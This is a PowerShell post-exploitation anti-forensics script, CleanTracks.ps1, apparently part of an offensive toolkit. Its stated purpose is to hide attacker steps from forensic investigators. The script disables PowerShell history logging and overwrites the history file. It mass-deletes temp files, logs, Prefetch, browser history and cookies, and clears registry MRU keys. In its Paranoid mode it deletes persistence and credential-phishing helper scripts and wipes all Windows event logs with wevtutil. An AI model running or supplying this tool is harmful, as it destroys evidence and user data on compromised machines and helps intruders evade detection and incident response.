<#
.SYNOPSIS
   Clean Temp\Logs\Script artifacts left behind

   Author: r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.1

.DESCRIPTION
   Module to clean artifacts that migth lead forensic investigatores to attacker steps.
   It deletes lnk, db, log, tmp files, recent folder, Prefetch, and registry locations.

.NOTES
   Required Dependencies: cmd|regedit {native}

.Parameter CleanTracks
   Accepts arguments: Clear and Paranoid

.EXAMPLE
   PS C:\> Get-Help .\CleanTracks.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\CleanTracks.ps1 -CleanTracks Clear
   Clean Temp\Logs\Script artifacts left behind

.EXAMPLE
   PS C:\> .\CleanTracks.ps1 -CleanTracks Paranoid
   Remark: Paranoid @arg deletes @redpill aux scripts

.OUTPUTS
   Function    Date     DataBaseEntrys ModifiedRegKeys ScriptsCleaned
   --------    ----     -------------- --------------- --------------
   CleanTracks 22:17:29 21             4               3
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$CleanTracks="false"
)


Write-Host ""
If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid"){
$Count = 0       ## Loop counter
$ModRegKey = 0   ## Registry keys to modifie
$MyArtifacts = 0 ## MyMeterpreter aux scripts
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null

    $ClearList = @(## Clear @arg
        "ipconfig /flushdns",
        "DEL /q /f /s %tmp%\*.vbs",
        "DEL /q /f /s %tmp%\*.bat",
        "DEL /q /f /s %tmp%\*.log",
        "DEL /q /f /s %tmp%\*.tmp",
        "DEL /q /f /s %userprofile%\*.log",
        "DEL /q /f /s %userprofile%\*.tmp",
        "DEL /q /f /s %windir%\Prefetch\*.*",
        "DEL /q /f /s %appdata%\Microsoft\Windows\Recent\*.*",
        "DEL /q /f /s %appdata%\Microsoft\Windows\Cookies\*.*",
        'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /f',
        'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f',
        'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
     )

     $ParanoidList = @(## Paranoid @arg
        "ipconfig /flushdns",
        "DEL /q /f %windir%\*.tmp",
        "DEL /q /f %windir%\*.log",
        "DEL /q /f /s %tmp%\*.vbs",
        "DEL /q /f /s %tmp%\*.bat",
        "DEL /q /f /s %tmp%\*.log",
        "DEL /q /f /s %tmp%\*.tmp",
        "DEL /q /f %windir%\system\*.tmp",
        "DEL /q /f %windir%\system\*.log",
        "DEL /q /f %windir%\system32\*.tmp",
        "DEL /q /f %windir%\system32\*.log",
        "DEL /q /f /s %windir%\Prefetch\*.*",
        "DEL /q /f /s %userprofile%\*.tmp",
        "DEL /q /f /s %userprofile%\*.log",
        "DEL /q /f /s %appdata%\Microsoft\Windows\Recent\*.*",
        "DEL /q /f /s %appdata%\Mozilla\Firefox\Profiles\*.*",
        "DEL /q /f /s %appdata%\Microsoft\Windows\Cookies\*.*",
        'DEL /q /f %appdata%\Google\Chrome\"User Data"\Default\*.tmp',
        'DEL /q /f %appdata%\Google\Chrome\"User Data"\Default\History\*.*',
        "DEL /q /f C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\Low\*.dat",
        'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /f',
        'REG DELETE "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f',
        'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f',
        'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
     )

     ## Loop truth Array Lists
     $DateNow = Get-Date -Format 'HH:mm:ss'
     If($CleanTracks -ieq "Clear"){$ModRegKey = "4"
         ForEach($Item in $ClearList){
             cmd /R $Item
             $Count++
         }
     }ElseIf($CleanTracks -ieq "Paranoid"){$ModRegKey = "5"
         ForEach($Item in $ParanoidList){
             cmd /R $Item
             $Count++
         }
     }

     ## Clean ALL files\folders under %TMP% except scripts.ps1
     $FilesToDelete = (Get-ChildItem -Path "$Env:TMP" -Recurse -Exclude *.ps1 -EA SilentlyContinue).FullName
     ForEach($Item in $FilesToDelete){
         Remove-Item $Item -Recurse -Force -EA SilentlyContinue
     }

     ## Clear PS Logging History
     $CleanPSLogging = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath
     If(-not($CleanPSLogging -ieq $null)){## 'ConsoleHost_history.txt' found
         echo "null" > $CleanPSLogging
     }Else{## Fail to find 'ConsoleHost_history.txt'
         ## Path: $Env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
         Write-Host "fail delete  - PS Logging History!"
     }


    ## Delete @redpill artifacts
    If($CleanTracks -ieq "Paranoid"){

       <#
       .SYNOPSIS
          Author: @r00t-3xp10it
          Paranoid @arg deletes @redpill auxiliary
          scripts and Deletes All eventvwr logs {eventvwr}

       .NOTES
         Persiste.vbs, Sherlock.ps1, webserver.ps1,
         Start-WebServer.ps1, CredsPhish.ps1 , Start-Hollow.p1
       #>

       $PersistePath = "$Env:APPDATA\Microsoft\Windows" +
       "\Start Menu\Programs\" + "Startup\Persiste.vbs" -join ''
       If(Test-Path -Path "$PersistePath" -EA SilentlyContinue){
           Remove-Item -Path "$PersistePath" -Force
           $MyArtifacts = $MyArtifacts+1
       }
       If(Test-Path -Path "$Env:TMP\Sherlock.ps1" -EA SilentlyContinue){
           Remove-Item -Path "$Env:TMP\Sherlock.ps1" -Force
           $MyArtifacts = $MyArtifacts+1
       }
       If(Test-Path -Path "$Env:TMP\webserver.ps1" -EA SilentlyContinue){
           Remove-Item -Path "$Env:TMP\webserver.ps1" -Force
           $MyArtifacts = $MyArtifacts+1
       }
       If(Test-Path -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue){
           Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force
           $MyArtifacts = $MyArtifacts+1
       }
       If(Test-Path -Path "$Env:TMP\Start-WebServer.ps1" -EA SilentlyContinue){
           Remove-Item -Path "$Env:TMP\Start-WebServer.ps1" -Force
           $MyArtifacts = $MyArtifacts+1
       }
       If(Test-Path -Path "$Env:TMP\Start-Hollow.ps1" -EA SilentlyContinue){
           Remove-Item -Path "$Env:TMP\Start-Hollow.ps1" -Force
           $MyArtifacts = $MyArtifacts+1
       }

       ## Delete All eventvwr logs {Administrator Privileges required}
       $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");
       If($IsClientAdmin){## wevtutil cl => requires Administrator rigths to run
           Write-Host "`n`nConsole Privs: Administrator" -ForegroundColor Yellow
           Write-Host "Cleaning $Remote_hostName\$Env:USERNAME Eventvwr logs ...`n" -ForeGroundColor Green
           wevtutil el|Foreach-Object {wevtutil cl "$_"}
           Write-Host ""
        }

    }

    Write-Host ""
    ## Create Data Table for output DateNow
    $mytable = new-object System.Data.DataTable
    $mytable.Columns.Add("Function") | Out-Null
    $mytable.Columns.Add("Date") | Out-Null
    $mytable.Columns.Add("DataBaseEntrys") | Out-Null
    $mytable.Columns.Add("ModifiedRegKeys") | Out-Null
    $mytable.Columns.Add("ScriptsCleaned") | Out-Null
    $mytable.Rows.Add("CleanTracks",
                      "$DateNow",
                      "$Count",
                      "$ModRegKey",
                      "$MyArtifacts") | Out-Null

    ## Display Table
    $mytable|Format-Table -AutoSize
    Write-Host "";Start-Sleep -Seconds 1
}